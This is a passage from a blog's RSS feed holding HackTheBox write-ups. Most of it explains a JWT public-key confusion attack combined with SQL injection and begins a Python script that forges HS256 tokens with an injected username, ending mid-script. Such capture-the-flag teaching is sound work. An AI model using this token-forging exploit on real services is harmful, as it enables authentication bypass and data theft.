&lt;p&gt;In this CTF, we learned a bit more Common Vulnerabilities: one regarding outdated Umbraco CMS; and the other, a CVE that retrieves TeamViewer password hases that can later be used to get the SYSTEM shell. Nothing too fancy, yet super thoughtful!&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sat, 06 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//remote-htb</link>
        <link href="http://localhost:4000/remote-htb"/>
        <guid isPermaLink="true">http://localhost:4000/remote-htb</guid>
      </item>
    
      <item>
        <title>Under Construction - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This challenge is one of the best CTFs I’ve ever played. It’s living proof of how simple things can unravel to reveal extraordinary complexity. HackTheBox always surprises me with its retired content.&lt;/p&gt;

&lt;p&gt;It took me almost three days to complete it, which I divided into three main activities:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;First day:&lt;/strong&gt; playing with the problem and reading the source code.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Second day:&lt;/strong&gt; researching JWT vulnerabilities on the internet, related to the challenge.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Third day:&lt;/strong&gt;  tweaking my payloads until I solved the challenge.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s take a look at what this CTF is about.&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Description&lt;/p&gt;

  &lt;p&gt;A company that specialises in web development is creating a new site that is currently under construction. Can you obtain the flag?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Nothing too revealing. We know nothing else about our target. Let’s start the machine and access it.&lt;/p&gt;

&lt;p&gt;Once started, we will receive an IP and port, like: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;&lt;/code&gt;. My first step was to establish a connection with it using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt;. When dealing with a challenge that specifies a port with its address, I usually start with telnet to get a glance of what I’m dealing with.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;telnet 159.65.20.166 32211
Trying 159.65.20.166...
Connected to 159.65.20.166.
Escape character is &lt;span class=&quot;s1&quot;&gt;&apos;^]&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
abc 
HTTP/1.1 400 Bad Request
Connection: close

Connection closed by foreign host.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This response indicates that the service is web-based, as it uses HTTP connections. Let’s access it with our browser:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc1.png&quot; alt=&quot;under construciton /auth page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems like a register/login simple form. What to do now. Let’s open up BurpSuite to see what’s going on when we try to register a new user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc2.png&quot; alt=&quot;register request/response&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc3.png&quot; alt=&quot;login request/response&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we successfully registered “mula” and logged in. We also got a session cookie, to what it seems to be a JWT (JSON Web Token) token.&lt;/p&gt;

&lt;p&gt;The challenge also lets us download some files. After downloading them, we can see that they are the source code of the page.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb/underc &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip Under&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;Construction.zip 
Archive:  Under Construction.zip
  inflating: index.js                
  inflating: package.json            
   creating: middleware/
  inflating: middleware/AuthMiddleware.js  
   creating: helpers/
  inflating: helpers/DBHelper.js     
  inflating: helpers/JWTHelper.js    
   creating: routes/
  inflating: routes/index.js         
   creating: views/
  inflating: views/auth.html         
  inflating: views/index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Upon a quick look at “index.js”, we find this line of code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc5.png&quot; alt=&quot;index.js&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indicating we have an authentication middleware that validates the request server-side. Let’s take a look at that now:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc6.png&quot; alt=&quot;middleware&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Which then leads us to the JWTHelper.js file, containing an implementation logic for JWT authentication:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc7.png&quot; alt=&quot;jwt-helper&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have a basic overview of what we are dealing with, let’s move on to our approach mindset.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;As always, let’s keep our mindset:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Understanding basic concepts&lt;/li&gt;
  &lt;li&gt;Understanding the problem&lt;/li&gt;
  &lt;li&gt;Crafting an attack&lt;/li&gt;
  &lt;li&gt;Solving&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We’ve already done some really basic recon with the challenge files and a burpsuite. Let’s get started!&lt;/p&gt;

&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;

&lt;p&gt;What are the things we need to know? First and foremost, we need to understand what JWTs are.&lt;/p&gt;

&lt;h3 id=&quot;json-web-tokens&quot;&gt;JSON Web Tokens&lt;/h3&gt;
&lt;p&gt;JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three parts separated by dots:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Header&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The header has two parts, the type or name of the token, which is usually JWT; and the signing algorithm, such as RSA or HMAC SHA256.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;typ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;JWT&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;alg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RS256&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Payload&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The payload consists of the information to be transferred. This is usually the username, a message, user role, etc.&lt;/p&gt;

&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;user1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;isAdmin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;Signature&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format JWTs take is:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;header-encoded&amp;gt;.&amp;lt;payload-encoded&amp;gt;.&amp;lt;signature&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For more information, you can check it out &lt;a href=&quot;https://jwt.io/introduction&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;

&lt;p&gt;Now that we know a bit more about JWTs, let’s go back to our application and check out the JWT issued when we logged in as “mula”. Let’s send the JWT generated by the server and use &lt;a href=&quot;https://jwt.io&quot;&gt;https://jwt.io&lt;/a&gt; to decode it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc8.png&quot; alt=&quot;jwt.io decoder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the payload we are receiving our username and an RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc9.png&quot; alt=&quot;authenticated challenge front page&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok. A few points to make here:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Every application that has user management must have a database and a way to communicate with this database.&lt;/li&gt;
  &lt;li&gt;The JWT sent to us as a cookie includes a public key, and the algorithm used for the signature is RS256.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Let’s address each point individually:&lt;/p&gt;

&lt;h3 id=&quot;database&quot;&gt;Database?&lt;/h3&gt;
&lt;p&gt;If we investigate index.js file from the challenge, we shall find that it is importing a DBHelper, which is also located at the helpers directory we found our JWTHelper.js file. We will then find DBHelper.js, which is where the server communicates with its database:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc10.png&quot; alt=&quot;DBHelper.js&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon a quick search, I’ve found &lt;a href=&quot;https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html&quot;&gt;this&lt;/a&gt; page about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; method used to query the database. We can see in their example a similarity with the construction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; method in the DBHelper.js, indicating a SQL injection. This is because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getUser&lt;/code&gt; is being called when someone access the / path, which then fetches the username through the JWT token.&lt;/p&gt;

&lt;h3 id=&quot;public-key&quot;&gt;Public Key?&lt;/h3&gt;

&lt;p&gt;This looked odd to me, so I had to do a good research. My first stop was at &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555&quot;&gt;HackTricks&lt;/a&gt;, which showed a probably attack vector. With further investigation, I found this &lt;a href=&quot;https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens&quot;&gt;OWASP&lt;/a&gt; article, which explains this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;The server must expect a JWT to be signed with a public key (RSxxx or ESxxx).&lt;/li&gt;
  &lt;li&gt;The server must not check which algorithm the JWT is actually using, or accept both RSxxx and HSxxx.&lt;/li&gt;
  &lt;li&gt;The public key used to verify the JWT must be available.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The attack occurs because the server erroneously uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; when the algorithm is switched from an RSA-based algorithm (RSxxx) to an HMAC-based algorithm (HSxxx). HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jwt.verify&lt;/code&gt; will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making the application to accept maliciously crafted tokens.&lt;/p&gt;

&lt;p&gt;Let’s see if it is our case. The first condition is met: the JWT header algorithm reveals to be RS256. The second condition is also met: if we look at the JWTHelper.js file, we see that in the decoding part the function accepts both RS256 and HS256.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc11.png&quot; alt=&quot;rs hs&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check if the public key provided by the application through the JWT is a valid signature. To do this, we will use &lt;a href=&quot;https://jwt.io&quot;&gt;https://jwt.io&lt;/a&gt; again:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/underc12.png&quot; alt=&quot;jwt.io signing jwt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After pasting the public key - provided by the JWT - in the box above, we can see that this is the correct public key used to sign the token. Therefore, the third condition is also met.&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;Alright! Now let’s think of a way to attack the application. We have two vulnerabilities here: a SQL injection in the getUser function, which uses the username parameter provided by the JWT token without any sanitization; and the application is vulnerable to Public Key Confusion.&lt;/p&gt;

&lt;p&gt;By combining these vulnerabilities, the attack strategy becomes clear: we can craft a JWT with a SQL injection payload in the username field. By exploiting the public key confusion, we can make the application accept our JWT.&lt;/p&gt;

&lt;p&gt;First, let’s save the public key on our local machine, naming the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pubkey.pem&lt;/code&gt;. Remember, for this to work correctly, it’s crucial to save the key exactly as shown below:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;No new lines. And make sure to include both begin statements.&lt;/p&gt;

&lt;p&gt;Let’s build a Python script that will create a maliciously crafted and signed JWT with our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pubkey.pem&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Usage: python exploit.py &amp;lt;payload&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;# read pubkey file
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./pubkey.pem&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;pk_contents&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    
    &lt;span class=&quot;n&quot;&gt;header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alg&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;HS256&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;JWT&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sqli&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pk&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pk_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# convert to base64
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;encoded_h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encoded_p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;urlsafe_b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# concatenate header and payload
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;unsigned_jwt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_h&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_p&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# HMAC 256 signing
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pk_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsigned_jwt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span 